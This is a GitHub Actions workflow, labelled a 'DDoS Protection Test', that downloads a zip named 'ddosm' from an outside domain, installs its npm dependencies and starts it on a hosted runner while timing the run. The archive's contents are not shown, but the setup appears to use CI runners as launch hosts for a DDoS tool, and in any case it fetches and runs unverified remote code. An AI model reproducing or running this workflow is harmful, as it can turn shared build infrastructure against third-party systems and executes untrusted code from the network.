name: Run DDoS Protection Test

on: workflow_dispatch

jobs:
  run:
    runs-on: ubuntu-latest
    container: node:18
    
    steps:
    - name: Start Timer
      run: echo "START_TIME=$(date +%s)" >> $GITHUB_ENV
    
    - name: Download and Extract
      run: |
        curl -L -o project.zip "https://reality.mahmud-tech.online/ddosm.zip"
        unzip project.zip -d ./project
        
        # List contents to see structure
        echo "ğŸ“ Extracted files:"
        ls -la ./project/
        echo ""
        echo "ğŸ“ Contents of ./project/ddosm/:"
        ls -la ./project/ddosm/
    
    - name: Install Dependencies
      run: |
        # Navigate to the correct directory where package.json is
        cd ./project/ddosm/
        echo "ğŸ“ Working directory: $(pwd)"
        echo "ğŸ“„ Checking for package.json:"
        ls -la package.json
        
        # Install dependencies
        npm install
        
    - name: Run the Application
      run: |
        cd ./project/ddosm/
        echo "ğŸš€ Starting application..."
        
        # Check what scripts are available
        echo "Available npm scripts:"
        npm run
        
        # Run the start script (or whatever script you need)
        npm start
        
    - name: Show Total Time
      if: always()
      run: |
        END_TIME=$(date +%s)
        TOTAL=$((END_TIME - START_TIME))
        
        HOURS=$((TOTAL / 3600))
        MINUTES=$(( (TOTAL % 3600) / 60 ))
        SECONDS=$((TOTAL % 60))
        
        echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
        echo "ğŸ“Š TOTAL EXECUTION TIME:"
        echo "   $HOURS hours, $MINUTES minutes, $SECONDS seconds"
        echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
